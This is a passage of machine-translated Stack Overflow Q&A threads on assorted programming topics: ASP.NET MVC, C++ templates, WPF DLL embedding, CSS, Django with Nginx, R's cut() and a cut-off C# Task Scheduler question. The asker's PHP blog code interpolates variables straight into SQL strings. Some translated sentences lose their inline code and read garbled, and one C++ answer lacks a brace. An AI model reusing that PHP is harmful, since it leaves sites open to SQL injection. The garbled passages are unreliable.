我想为订阅者页面（处理电子邮件营销的 MVC4 应用程序的一部分）实现一个视图。我要实现的是：

1) 当用户单击“+ 添加列表”按钮时，左侧会出现一个新的类别并且光标应该闪烁，这意味着它应该准备好从用户那里接收类别的名称。我还希望每当用户将鼠标悬停在左侧的任何类别名称上时，应该会出现一个包含两个按钮（编辑和删除）的小栏，让用户可以编辑类别名称或删除该类别。我想要的是所有这些都必须在不重新加载页面的情况下发生。

2) 当用户单击“+ 添加联系人”按钮时，应出现一个包含两个选项卡的弹出对话框，让用户可以手动输入详细信息或上传 CSV 以捕获详细信息。每当用户在弹出的对话框中单击“添加联系人”按钮或“上传并添加联系人”时，我希望新的联系人显示在图片所示的联系人列表区域中（再次，无需重新加载页面）。我也想要联系人的相同悬停栏（与类别相同）。

![在此处输入图像描述](https://i.stack.imgur.com/SqX5q.png)

我对如何在 Razor 视图中实现这一点感到困惑？我用什么 - JavaScript/jQuery/AJAX？

我几乎迷路了。有人可以指导我一点，以便我可以继续并完成我的第一个 MVC4 项目吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T07:25:46.050

您需要一些 JavaScript 库，例如 jQuery UI 或 Kendo UI，我建议此时使用 jQuery UI。他们有很多小部件，但看看这些。请记住，cshtml 视图可以像 html 页面一样查看，您可以在其中拥有您想要的所有标签、css 和 javascript：

[http://jqueryui.com/dialog/](http://jqueryui.com/dialog/)

[http://jqueryui.com/tabs/](http://jqueryui.com/tabs/)

[http://jqueryui.com/](http://jqueryui.com/)

# c++ - C++中字符串和int的函数模板

> ID：16184885
> 
> 赞同：4
> 
> 时间：2013-04-24T06:29:39.783
> 
> 标签：c++, templates

我想要一个函数模板，它接受一个向量和一个元素，并返回这个元素在向量中的位置。我希望这个函数适用于 int 和 std::string 类型。这是函数模板定义：

```
template<class T>
int findElement(const vector<T> &vec, const T &ele)
{
    for(size_t i = 0; i < vec.size(); i++)
    {
        if(typeid(ele) == typeid(std::string))
        {
            if(ele.compare(vec[i]) == 0)
                return i;
        }
        else
        {
            if(ele == vec[i])
                return i;
        }
    }
    return -1;
} 
```

如您所见，我最初正在检查类型，以便可以使用适当的比较方法。当我使用 std::string 类型参数调用时，这工作正常，但是当我使用 double 类型时它会给出以下错误：

```
 error C2228: left of '.compare' must have class/struct/union 
```

和

```
see reference to function template instantiation 'int findElement<double>(const std::vector<_Ty> &,const T &)' being compiled 
```

我该如何解决这个问题？

谢谢，拉克什。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-24T06:32:07.760

使用模板时，您*永远*不必检查。以预期的方式定义，所以使用它！`typeid``std::string``==`

```
template<class T>
int findElement(const vector<T> &vec, const T &ele)
{
    for(size_t i = 0; i < vec.size(); i++)
    {
        if(ele == vec[i])
            return i;
    }
    return -1;
} 
```

通常，如果您需要针对特定​​类型对模板化函数进行特殊处理，请使用*模板专业化*：

```
template<class T>
int findElement(const vector<T> &vec, const T &ele) {
    for(size_t i = 0; i < vec.size(); i++) {
        if(ele == vec[i])
            return i;
    return -1;
}

template<>
int findElement<std::string>(const vector<std::string> &vec, const std::string &ele) {
    for(size_t i = 0; i < vec.size(); i++) {
        if(ele.compare(vec[i]) == 0)
            return i;
    }
    return -1;
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-04-24T06:32:22.270

`std::string``operator ==`但是，如果你想调用不同的方法，你`T`应该专门化，或者重载函数。`Typeid`无能为力，因为它是运行时类型识别。

重载示例

```
template<class T>
int findElement(const vector<T> &vec, const T &ele)
{
    for(size_t i = 0; i < vec.size(); i++)
    {
        if(ele == vec[i])
             return i;
    }
    return -1;
}

int findElement(const vector<string>& vec, const string& ele)
{
   for (size_t i = 0; i < vec.size(); ++i)
   {
      if (ele.compare(vec[i]) == 0)
          return i;
   }
   return -1;
} 
```

此外，您`function overloading`只能用于比较，因为循环是相同的。

# java - Metro 添加额外的编组类

> ID：16184889
> 
> 赞同：1
> 
> 时间：2013-04-24T06:29:51.200
> 
> 标签：java, marshalling, java-metro-framework

我有一个非常通用的 wsdl，我无法更改。我使用 Metro 为给定的 wsdl 生成了存根。存根参数对象之一接受的对象列表是此 wsdl 的通用部分。此列表的内容是表示为 String 的 XML，不得转义。我有这个 XML 的模式和使用 jaxb 生成的类（与 metro 生成的类相同，因为它也使用 jaxb）。现在如果我做这样的事情

```
Startup startup = new Startup();
startup.getContent().add(myGeneratedJaxBObject);
getStub().someMethod(startup); 
```

我会得到一个错误，即 myGeneratedObject 无法编组，因为这些类对于存根的 JaxB 上下文是未知的。有没有办法让我的课程成为存根的一部分？

# c# - Cannot run toolkits without certain dll's in folder?/

> ID：16184895
> 
> 赞同：2
> 
> 时间：2013-04-24T06:30:11.313
> 
> 标签：c#, wpf

I am very new to programming and would love some help. I just installed MahApps.Metro and it looks really nice and nifty. But I cannot run the program without System.Windows.Interactivity.dll and MahApps.Metro.dll in the same folder, if I try running it without those two DLL's it just .. doesn't open. Is there a way to incorporate those DLL's in the exe or just run it without them?

Thanks in advance for any help!

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T06:53:51.323

您可以使用 ILMerge ( [http://www.microsoft.com/en-us/download/details.aspx?displaylang=en&id=17630](http://www.microsoft.com/en-us/download/details.aspx?displaylang=en&id=17630) )。

使用 ILMerge，可以将所有程序集（文件夹中的所有 dll）合并到一个 exe 文件中。看到这个解释：[http ://research.microsoft.com/en-us/people/mbarnett/ILMerge.aspx](http://research.microsoft.com/en-us/people/mbarnett/ILMerge.aspx)

但是部署所有程序集有什么问题。我认为这在当今很常见。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T06:44:03.243

如果使用了这些程序集，您将无法运行您的应用程序。毕竟，您正在使用仅在这些程序集中的代码，如果您的应用程序除了关闭之外没有找到所需的代码，应该怎么办？

但是有一种方法可以将程序集嵌入到您的 exe 中，因此您只需重新分发一个文件。引用的程序集可以作为嵌入式资源添加（将 dll 添加到您的项目并将其设置`"Build Action"`为`"Embedded Resource"`）并从那里加载。

然后，您需要自己加载它，[`AppDomain.AssemblyResolve`](http://msdn.microsoft.com/en-us/library/system.appdomain.assemblyresolve.aspx)以防当前[`AppDomain`](http://msdn.microsoft.com/en-us/library/w124b5fa.aspx). 为此，您需要向此事件添加一个处理程序，如下所示：

```
AppDomain.CurrentDomain.AssemblyResolve += (sender, args) => {
    String resourceName = 
        "YourDefaultNameSpace." + new AssemblyName(args.Name).Name + ".dll";
    using (var stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resourceName)) {
        Byte[] assemblyData = new Byte[stream.Length];
        stream.Read(assemblyData, 0, assemblyData.Length);
        return Assembly.Load(assemblyData);
    }
}; 
```

对于 WPF 应用程序，您可以覆盖[App.OnStartup](http://msdn.microsoft.com/en-us/library/system.windows.application.onstartup.aspx) (in `App.xaml.cs`) 并将其添加到那里：

```
protected override void OnStartup(StartupEventArgs e) {
    base.OnStartup(e);
    // ---- Add the handler code here ----
} 
```

原始来源和更多详细信息：
[Jeffrey Richter: Excerpt #2 from CLR via C#, Third Edition](http://blogs.msdn.com/b/microsoft_press/archive/2010/02/03/jeffrey-richter-excerpt-2-from-clr-via-c-third-edition.aspx)

# css - 使用 Unicode 字体作为@font-face

> ID：16184907
> 
> 赞同：0
> 
> 时间：2013-04-24T06:30:47.920
> 
> 标签：css, unicode, font-face

在我的网页 css 文件中，我使用了“Bangla”（孟加拉国）unicode 字体 - “SolaimanLipi”作为`font-face`；我确定位置正确，字体名称重命名为“sol.ttf”。我像这样链接了字体，并在我的页面中使用了很多地方作为`font-family:bodyf`.

```
@font-face {
    font-family:bodyf;
    src: url("../font/sol.ttf");
    format("opentype");
} 
```

**它在我的本地服务器上运行良好。但是在托管服务器上托管后它不起作用。**

我的代码有什么问题或我错过了什么？谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:44:29.170

也许，使用元标记在页面上指定**字符集**`charset`可以解决问题。

所以，试着写在你的`<head>`标签中（我认为 utf-8 可能对你有用）：

```
<meta charset='YOUR_SET'> 
```

或者，如果您在 html5 之前的页面中，则可以使用长版本：

```
<meta http-equiv='Content-Type' content='text/html; charset=YOUR_SET'> 
```

`charset`有关元标记的更多信息在[这里](http://www.w3schools.com/tags/att_meta_charset.asp)。

另一种可能性是**托管相对路径**的问题。尝试输入字体文件的绝对路径。在你的 CSS 中这样写：

```
@font-face {
    font-family:bodyf;
    src: url("http://www.shebamcsl.com/.../font/sol.ttf") format("opentype");
} 
```

其他可能性涉及**兼容性**。阅读[本文](http://blog.themeforest.net/tutorials/how-to-achieve-cross-browser-font-face-support/)以了解有关每个浏览器的详细信息的更多信息。完整的骨架`@font-face`如下：

```
@font-face {
    font-family: 'bodyf';
    src: url('../font/sol.eot');
    src: local('body f'),
         url('../font/sol.ttf') format('truetype'),
         url('../font/sol.svg#font') format('svg'); 
} 
```

# html - CSS 包装器/Clearfix 分辨率

> ID：16184909
> 
> 赞同：4
> 
> 时间：2013-04-24T06:30:53.620
> 
> 标签：html, css, css-float, clearfix

试图让我的浮动元素与我的所有内容一起扩展时遇到问题。我已经做了一些研究，但我已经被正式难住/筋疲力尽了。我尝试了一些 clearfix 分辨率，标准的、微型的和内联的，基本上是这篇[文章](https://stackoverflow.com/questions/211383/which-method-of-clearfix-is-best/1633170#1633170)中列出的所有内容。

我的理论：

1.  我的语法有问题，或者我没有将 放在`<div>`正确的位置。
2.  我正在以不允许我扩展包装器的方式处理内容或帖子。
3.  我是一个非常特别的舔窗者。

* * *

## 我的代码

***样式表：***

```
/*------------------------Wrapper------------------------*/

html, body, #wrapper, .bar, .line, .content{
margin: 0;
padding: 0;
height: 100%;
}

#wrapper{
width: 100%;
overflow: auto;
}

.bar{
float: left;
width: 5%;
}

.line{
float: left;
width: 1%;
}

.content{
float:left;
width:88%;
}

.white{
background-color: #FFFFFF;
}

.red{
background-color: #A80000;
}

.black{
background-color: #000000;
background-image:url('http://i.imgur.com/bcq2U.png');
background-repeat:no-repeat;
background-position:bottom right;
background-attachment:fixed;
}

/*------------------------Navigation------------------------*/

#nav{
width: 100%;
float: left;
background-color: #A80000;
border-bottom: 1px solid #C4A23E;
}

ul {
list-style: none;
width: 100%;
margin: 0 auto;
padding: 0; 
font-family: "Arial";
}

li{
float: left;
}

li a{
display: block;
padding: 8px 15px;
text-decoration: none;
color: #000000;
background-color:#A80000;
border-right: 1px solid #C4A23E; }

li a:hover{
color: #A80000;
background-color: #C4A23E; 
}

/*------------------------Text------------------------*/

h1 {
color: #FFFFFF;
font-family: "Arial";
text-alighn:center;
}

/*------------------------Boxes------------------------*/

.post{
float:left;
display:inline;
border-style:groove;
border-width:2px;
border-color:#A80000;
background-image:url('http://i.imgur.com/kOFxo.png');
background-repeat:no-repeat;
background-position: top left;
background-color:white;
width:60%;
margin:0px auto;
text-align:left;
padding:2px 5px 2px 5px;
margin:1cm 0cm 1cm 1cm;
}

.logbox{
float:left;
border-style:groove;
border-width:2px;
border-color:#A80000;
background-image:url('http://i.imgur.com/kOFxo.png');
background-repeat:no-repeat;
background-position:top left;
background-color:white;
margin:0px auto;
text-align:center;
padding:80px 80px 80px 80px;
margin:1cm 0cm 1cm 1cm;
}

/*------------------------ClearfixA------------------------*/
/*
.clearfix:after{
content:".";
display:block;
clear:both;
visibility:hidden;
line-height:0;
height:0;
}

.clearfix{
display:inline-block;
}

html[xmlns].clearfix{
display:block;
}

*html.clearfix{
height:1%;
}
*/
/*------------------------ClearfixB------------------------*/

.cf:before,
.cf:after{
content:"";
display:table;
}

.cf:after{
clear:both;
}

.cf{
zoom: 1;
} 
```

***网页：***

```
<? include "config.php";
include_once "markdown.php";
$my_html = Markdown($my_text);
?>

<!-- HTML Start -->

<html>
<head>
<link rel="stylesheet" type="text/css" href="styleB.css"/>
<title>Blog</title>
</head>
<body>

<!-- Wrapper  Start -->

<div id="wrapper">
<div class="wrapper cf">
<span class="bar white"></span>
<span class="line red"></span>
<span class="content black">

<!-- Content  Start -->

<h1>Project Hollywood</h1>

<div id="nav">

<?session_start();
if (!isset($_SESSION['username'])){?>

<ul>
<li><a href="login.php">Sign In</a></li>
<li><a href="index.php">Home</a></li>
</ul>

<?}
else{
?>

<ul>
<li><a href="index.php">Home</a></li>
<li><a href="admin.php">Admin Panel</a></li>
<li><a href="logout.php">Sign Out</a></li>
</ul>

<?}
?>

</div>

<!-- Entries  Start -->

<?$query= "SELECT *
FROM entries
ORDER BY submitted DESC";
$result= mysql_query($query);
$num = mysql_numrows($result);
?>

<?$i=0;
while ($i < $num){
$submit = mysql_result($result, $i, "submitted");
$title  = mysql_result($result, $i, "title");
$content = mysql_result($result, $i, "content");
$userid = mysql_result($result, $i, "userid");
$id = mysql_result($result, $i, "id");
?>

<?$q = "SELECT username
FROM users
WHERE $userid = uid";
$r = mysql_query($q);
$username = mysql_result($r, 0, "username");
?>

<span class="post">
<h3><?=$title?></h3>
<?=$submit?><br/>
<?=$username?>
<p><?=$content?></p><br/>

<?$que = "SELECT  t.tag
FROM tags AS t
INNER JOIN idx AS i ON t.tagid = i.tid
INNER JOIN entries AS e ON i.eid = e.id
WHERE e.id = '$id'";
$res = mysql_query($que);
$n = mysql_numrows($res);
$x=0;
?>

Tags:

<?while ($x < $n){
$tag = mysql_result ($res, $x, "tag");
$tid = mysql_result ($res, $x, "tid");
?>

<a href = "tag.php?tid=<?=$tag?>">
<?=$tag?></a>,

<?$x++;
}
?>

</span>

<?$i++;
}
?>

<!-- Entries & Content End -->

</span>
<span class="line red"></span>
<span class="bar white"></span>
</div>
</div>

<!-- Wrapper End -->

</body>
</html>

<!-- HTML End --> 
```

* * *

这是我在 Chrome 上看到的图像：

![在此处输入图像描述](https://i.stack.imgur.com/pqvbX.png)

任何解决方案、想法、资源、帮助、建议将不胜感激。

另外，我读到 FLOAT 模板会在某个时间点过时和/或不是设计网页的最佳方式。任何有关如何执行此操作的建议或资源也将受到欢迎。

* * *

**编辑**2013 年 4 月 24 日

添加查看页面源后收到的代码。

```
<!-- HTML Start -->

<html>
<head>
<link rel="stylesheet" type="text/css" href="styleB.css"/>
<title>Blog</title>
</head>
<body>

<!-- Wrapper  Start -->

<div id="wrapper">
<div class="wrapper cf">
<span class="bar white"></span>
<span class="line red"></span>
<span class="content black">

<!-- Content  Start -->

<h1>Project Hollywood</h1>

<div id="nav">

<ul>
<li><a href="login.php">Sign In</a></li>
<li><a href="index.php">Home</a></li>
</ul>

</div>

<!-- Entries  Start -->

<div class="post">
<h3>Lorem Ipsum Contd</h3>
2013-04-22 16:01:31<br/>
admin<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer pharetra sapien metus, id imperdiet erat. Cras sit amet venenatis ante. Sed velit nunc, lobortis eget facilisis vitae, eleifend non magna. Praesent mattis justo a sapien tempor hendrerit. Vestibulum commodo cursus ipsum at feugiat. Morbi porta mauris at metus tempor elementum. Nulla facilisi. Vestibulum accumsan mauris ac mauris egestas dapibus. Curabitur ultrices purus vitae tellus ullamcorper posuere.</p><br/>

Tags:

<a href = "tag.php?tid=Lorem">
Lorem</a>,

<a href = "tag.php?tid=Ipsum">
Ipsum</a>,

<a href = "tag.php?tid=Lorem Ipsum">
Lorem Ipsum</a>,

</div>

<div class="post">
<h3>Lorem Ipsum</h3>
2013-04-22 00:12:40<br/>
admin<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer pharetra sapien metus, id imperdiet erat. Cras sit amet venenatis ante. Sed velit nunc, lobortis eget facilisis vitae, eleifend non magna. Praesent mattis justo a sapien tempor hendrerit. Vestibulum commodo cursus ipsum at feugiat. Morbi porta mauris at metus tempor elementum. Nulla facilisi. Vestibulum accumsan mauris ac mauris egestas dapibus. Curabitur ultrices purus vitae tellus ullamcorper posuere.</p><br/>

Tags:

<a href = "tag.php?tid=Lorem">
Lorem</a>,

<a href = "tag.php?tid=Ipsum">
Ipsum</a>,

</div>

<!-- Entries & Content End -->

</span>
<span class="line red"></span>
<span class="bar white"></span>
</div>
</div>

<!-- Wrapper End -->

</body>
</html>

<!-- HTML End --> 
```

也是一个[JS Bin](http://jsbin.com/afusob/1/edit)复制。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-24T12:32:17.810

在`.content`您的 CSS 中，添加`overflow: auto;`. 这将自动将您的 div 包裹在您的内容周围。

# c++ - 使用 g++ 编译器 (Ubuntu) 将 Allegro 库链接到 C++ 应用程序

> ID：16184916
> 
> 赞同：1
> 
> 时间：2013-04-24T06:31:25.480
> 
> 标签：c++, ubuntu, linker, allegro

在尝试让 Allegro（一个 C++ 游戏编程库）在 Ubuntu 12.04 中使用一个非常简单的 C++ 应用程序时，我无法让程序使用 allegro 标头定义进行编译。它返回错误**allegro.h - 找不到这样的文件或目录**。我尝试运行 pkg-config 来找到正确的链接器命令，但这对编译没有帮助。

我几乎可以肯定它此时已正确安装。我尝试使用 pkg-config --cflags --libs allegro-5.0 作为包含文件路径，但在 g++ 编译行中使用时，这些路径都不起作用。

提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:59:09.890

运行**pkg-config --cflags --libs allegro-5.0**在包含路径上告诉我错误。它告诉我使用**-I/usr/local/include**并且在对该文件夹进行了一些挖掘之后，我发现包含路径是**-I/usr/local/include/allegro5**。现在编译正常。

# eclipse - Eclipse 运行历史

> ID：16184922
> 
> 赞同：0
> 
> 时间：2013-04-24T06:31:37.480
> 
> 标签：eclipse, configuration, runtime

eclipse 记得上次执行程序是什么时候吗？我知道有运行配置，但这并没有跟踪过去的执行及其执行顺序。

当一个程序在 shell 上执行时，shell 会跟踪它们的执行顺序吗？我想要 eclipse 中的类似实用程序以及执行时间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-24T07:30:27.920

您可以在调试视图或控制台视图（单击屏幕图标附近的箭头）中查看已运行的程序和开始时间。
编辑：在首选项/（运行/调试）/启动中取消选中“创建新启动时删除终止启动”。

如果您清除命中或关闭 Eclipse，则此列表将被重置。

如果您想要更永久的信息，我认为您的程序应该将该信息记录在文件中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T08:40:41.440

如果您需要程序执行的时间，请让您的程序自行输出时间。Eclipse 中没有任何东西可以完全满足您的需求。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-24T06:37:04.190

您可以使用 ctrl+f11 执行您之前最近的程序。有关详细信息，您可以转到运行->运行历史记录。

# django - django over https 表单重定向问题

> ID：16184924
> 
> 赞同：3
> 
> 时间：2013-04-24T06:31:47.897
> 
> 标签：django, https, django-admin

我正在使用 Nginx + supervisord 在 SSL 后面托管一个 django 站点。站点索引加载正常。没有使用本地服务器的 HTTPS，本地一切都可以正常工作。我正在使用 Django 1.4.2

出于某种原因，我得到了奇怪的重定向。

使用管理员时，如果我编辑任何项目，我会被重定向到主页。提交新项目进行保存时，我得到 404（但数据已保存）。

非管理员：再次提交表单将我返回到主页而不是“成功”。

去主页的原因我可以解释。`https://localhost`我的 nginx使用 301 重定向将所有非 http 流量重定向到。所以我猜 django 认为我不需要在某些地方使用安全 URL。

问题是 django 没有假设安全 url 或者 request.is_secure 是 False。

我已经注意到这个 SO [Accessing Django Admin over HTTPS behind Nginx](https://stackoverflow.com/questions/11943491/accessing-django-admin-over-https-behind-nginx) Made the changes for proxy pass，我认为它没有做任何事情来处理这个问题。但这里就是这样。

设置.py

```
SESSION_COOKIE_SECURE = True
SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTOCOL', 'https')
CSRF_COOKIE_SECURE = True 
```

警告：我对 Django 相当陌生。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T16:03:44.440

我删除了 Nginx 重定向。Django 已经正确处理了重定向。这是我与 nginx 代理通行证一起使用的 settings.py 值

```
SESSION_COOKIE_SECURE = True
SECURE_PROXY_SSL_HEADER = ('HTTP_X_FORWARDED_PROTOCOL', 'https')
CSRF_COOKIE_SECURE = True 
```

Nginx 代理

```
 location / {
        proxy_pass_header Server;
        proxy_set_header Host $http_host;
        proxy_redirect off;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Scheme $scheme;
        proxy_set_header X-Forwarded-Protocol $scheme;
        proxy_connect_timeout 10;
        proxy_read_timeout 10;
        proxy_pass http://localhost:8000/;
    } 
```

其中 localhost:8000 是 gunicorn 运行的位置。

我还有其他问题，但重定向问题已解决。

# ios - 如何自定义位置管理器提示？

> ID：16184926
> 
> 赞同：1
> 
> 时间：2013-04-24T06:31:55.680
> 
> 标签：ios, cllocationmanager, locationmanager

我正在开发一个应用程序。在这个应用程序中，我想自定义位置管理器提示警报。这个提示问“XXX”想使用你当前的位置。

我附上了一个关于这个的屏幕截图。 ![在此处输入图像描述](https://i.stack.imgur.com/egams.png)

现在我想要显示自定义警报。这实际上不会像警报一样。它只会要求使用您当前的位置或城市/州/邮编。

这样，当用户单击使用当前位置时，它将像默认位置管理器提示一样。否则将打开其他页面，用户可以进入手续。

请指导我。

谢谢，

CP

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-06-15T08:05:53.740

过去，您必须`NSLocationUsageDescription`在 info.plist 文件中使用。在 iOS 8 之后，你必须使用`NSLocationWhenInUseUsageDescription`和`NSLocationAlwaysUsageDescription`.

**注意：从 iOS 8 开始，您应该为您的位置使用添加适当的描述。否则您的应用将被 App Store 应用审阅者拒绝。**

在 info.plist 中添加描述后。它将显示如下所示的权限警报视图。

[![在此处输入图像描述](https://i.stack.imgur.com/H2zTY.png)](https://i.stack.imgur.com/H2zTY.png)

[![在此处输入图像描述](https://i.stack.imgur.com/uvyV1.png)](https://i.stack.imgur.com/uvyV1.png)

# c# - 带有热点的图像中的选项卡

> ID：16184928
> 
> 赞同：0
> 
> 时间：2013-04-24T06:32:02.233
> 
> 标签：c#, drawing

我有一个我不知道如何解决的问题。我正在为我工​​作的公司创建一个程序。该程序必须为我们运输的货物写下一个交付页面，因为目前该公司有超过 100 个 Excel 文件，每个交付一个。

我现在得到的是一个带有图像的图片框，该图像有 16 个热点。对于热点，我的意思是 Rectangles(Bounds) 以了解用户单击了图像上的哪个部分，因为需要选择该部分。到目前为止没有问题。但我唯一的问题是点击 Tab 按钮时。

点击标签按钮时，如何从图像上的矩形切换到另一个矩形。因为因为矩形边界上没有制表位。

我已经尝试使用 tabstop 添加自定义控件并且效果很好，但是我遇到了这个问题，即必须写入内容的数据仅限于该区域。所以我需要直接在图像上绘制它所以使用控件对我来说是没有选择的。

希望我的描述足够清楚，否则请随时提问。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T17:53:15.457

我设法用底层代码解决了我自己的问题

```
protected override bool ProcessDialogKey(Keys keyData)
        {
            int selectionIndex = pBoundsCollection.IndexOf(pSelection);
            if (keyData == Keys.Tab)
            {
                while (selectionIndex++ <= pBoundsCollection.Count)
                {
                    if (selectionIndex >= pBoundsCollection.Count)
                    {
                        selectionIndex = 0;
                        pSelection = (CMRField)pBoundsCollection[selectionIndex];
                        Refresh();
                        break;
                    }
                    if (((CMRField)pBoundsCollection[selectionIndex]).IsSelectable)
                    {
                        pSelection = (CMRField)pBoundsCollection[selectionIndex];
                        Refresh();
                        return false;
                    }
                }
            }
            return base.ProcessDialogKey(keyData);
        } 
```

# r - Cut() 错误 - 'breaks' 不是唯一的

> ID：16184947
> 
> 赞同：51
> 
> 时间：2013-04-24T06:33:33.773
> 
> 标签：r

我有以下数据框：

```
 a         
    ID   a.1    b.1     a.2   b.2
1    1  40.00   100.00  NA    88.89
2    2  100.00  100.00  100   100.00
3    3  50.00   100.00  75    100.00
4    4  66.67   59.38   NA    59.38
5    5  37.50   100.00  NA    100.00
6    6  100.00  100.00  100   100.00 
```

当我将以下代码应用于此数据框时：

```
 temp <- do.call(rbind,strsplit(names(df)[-1],".",fixed=TRUE))
 dup.temp <- temp[duplicated(temp[,1]),]

 res <- lapply(dup.temp[,1],function(i) {
 breaks <- c(-Inf,quantile(a[,paste(i,1,sep=".")], na.rm=T),Inf)
 cut(a[,paste(i,2,sep=".")],breaks)
 }) 
```

cut() 函数报错：

```
 Error in cut.default(a[, paste(i, 2, sep = ".")], breaks) : 
 'breaks' are not unique 
```

但是，相同的代码在类似的数据帧上运行良好：

```
 varnames<-c("ID", "a.1", "b.1", "c.1", "a.2", "b.2", "c.2")

 a <-matrix (c(1,2,3,4, 5, 6, 7), 2,7)

 colnames (a)<-varnames

 df<-as.data.frame (a)

    ID  a.1  b.1  c.1  a.2  b.2  c.2
  1  1    3    5    7    2    4    6
  2  2    4    6    1    3    5    7

 res <- lapply(dup.temp[,1],function(i) {
 breaks <- c(-Inf,quantile(a[,paste(i,1,sep=".")], na.rm=T),Inf)
 cut(a[,paste(i,2,sep=".")],breaks)
 })

 res
[[1]]
[1] (-Inf,3] (-Inf,3]
Levels: (-Inf,3] (3,3.25] (3.25,3.5] (3.5,3.75] (3.75,4] (4, Inf]

[[2]]
[1] (-Inf,5] (-Inf,5]
Levels: (-Inf,5] (5,5.25] (5.25,5.5] (5.5,5.75] (5.75,6] (6, Inf]

[[3]]
[1] (5.5,7] (5.5,7]
Levels: (-Inf,1] (1,2.5] (2.5,4] (4,5.5] (5.5,7] (7, Inf] 
```

这个错误的原因是什么？如何修复？谢谢你。

* * *

## 回答 #1

> 赞同：46
> 
> 时间：2013-04-24T06:40:26.233

您会收到此错误，因为您的数据中的分位数值 columns `b.1`，`a.2`并且`b.2`对于某些级别是相同的，因此它们不能直接用作 function 中的中断值`cut()`。

```
apply(a,2,quantile,na.rm=T)
       ID      a.1    b.1   a.2      b.2
0%   1.00  37.5000  59.38  75.0  59.3800
25%  2.25  42.5000 100.00  87.5  91.6675
50%  3.50  58.3350 100.00 100.0 100.0000
75%  4.75  91.6675 100.00 100.0 100.0000
100% 6.00 100.0000 100.00 100.0 100.0000 
```

解决此问题的一种方法是放入函数`quantile()`内部`unique()`- 因此您将删除所有不唯一的分位数值。如果分位数不是唯一的，这当然会减少断点。

```
res <- lapply(dup.temp[,1],function(i) {
  breaks <- c(-Inf,unique(quantile(a[,paste(i,1,sep=".")], na.rm=T)),Inf)
  cut(a[,paste(i,2,sep=".")],breaks)
})

[[1]]
[1] <NA>        (91.7,100]  (58.3,91.7] <NA>        <NA>        (91.7,100] 
Levels: (-Inf,37.5] (37.5,42.5] (42.5,58.3] (58.3,91.7] (91.7,100] (100, Inf]

[[2]]
[1] (59.4,100]  (59.4,100]  (59.4,100]  (-Inf,59.4] (59.4,100]  (59.4,100] 
Levels: (-Inf,59.4] (59.4,100] (100, Inf] 
```

* * *

## 回答 #2

> 赞同：21
> 
> 时间：2013-11-07T20:47:16.467

如果您希望保留分位数，另一种选择是添加一点抖动，例如

```
breaks = c(-Inf,quantile(a[,paste(i,1,sep=".")], na.rm=T),Inf)
breaks = breaks + seq_along(breaks) * .Machine$double.eps 
```

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2014-10-10T18:39:52.540

您可以使用 .bincode 代替 cut，它接受非唯一的中断向量。

* * *

## 回答 #4

> 赞同：6
> 
> 时间：2015-10-16T14:11:56.940

如果您说十分位数、四分位数等时实际上是指人口的 10% 或 25%，而不是十分位数/四分位数桶的实际数值，您可以首先对您的值进行排名，然后`quantile`在排名上应用函数：

```
a <- c(1,1,1,2,3,4,5,6,7,7,7,7,99,0.5,100,54,3,100,100,100,11,11,12,11,0)
a_ranks <- rank(a, ties.method = "first")
decile <- cut(a_ranks, quantile(a_ranks, probs=0:10/10), include.lowest=TRUE, labels=FALSE) 
```

# mysql - 为多个表添加索引

> ID：16184948
> 
> 赞同：0
> 
> 时间：2013-04-24T06:33:39.067
> 
> 标签：mysql, sql

我想创建一个索引，其中包含来自不同表的 2 列。

我尝试通过 phpmyadmin 界面但没有运气。我怎样才能用mysql实现这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-24T06:36:37.127

你不能。索引与单个表相关，唯一接近您希望的是两个索引表之间的 JOIN，但仍然，`this is not what you're looking for. Move along`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-24T06:35:45.747

据我所知，您只能为同一张表的列添加索引。所以你必须分别创建你的两个索引。一个用于 tableA 中的 2 列，另一个用于 tableB 中的列。

# c# - 从提升的进程 C# 在非提升的浏览器中打开网页

> ID：16184956
> 
> 赞同：3
> 
> 时间：2013-04-24T06:34:17.847
> 
> 标签：c#, windows, visual-studio, scheduled-tasks, elevation

几周以来，我一直在尝试从提升的进程运行非提升的网络浏览器，我尝试了各种方法，复制资源管理器令牌，使用[此处提到](https://stackoverflow.com/a/287072/127602)的 WinSafer API以及其他各种失败的技术。最后我决定使用微软的使用任务计划程序来运行应用程序的建议。

我使用了[Task Scheduler Managed Wrapper](http://taskscheduler.codeplex.com/)，起初我尝试运行 explorer.exe 并将 url 作为命令传递，但这不起作用，所以我创建了一个虚拟可执行文件，它将使用 Process.Start 启动站点。

这是我创建任务的方式：

```
public static void LaunchWin8BrowserThroughTaskScheduler(string sURL)
        {
            String RunAsUserExecPath = AppDomain.CurrentDomain.BaseDirectory + "URLLaunch.exe";

            String Command = string.Format("-w \"{0}\"", sURL);

            using (TaskService ts = new TaskService())
            {
                TaskDefinition td = ts.NewTask();
                td.RegistrationInfo.Description = "URL Launch";
                td.Principal.LogonType = TaskLogonType.InteractiveToken;
                TimeTrigger trigger = new TimeTrigger(DateTime.Now.AddSeconds(2))
                                          {
                                              Enabled = true,
                                              EndBoundary = DateTime.Now.AddSeconds(10)
                                          };

                td.Triggers.Add(trigger);

                td.Actions.Add(new ExecAction( RunAsUserExecPath, Command, null));
                td.Settings.StartWhenAvailable = true;
                //Delete the task after 30 secs
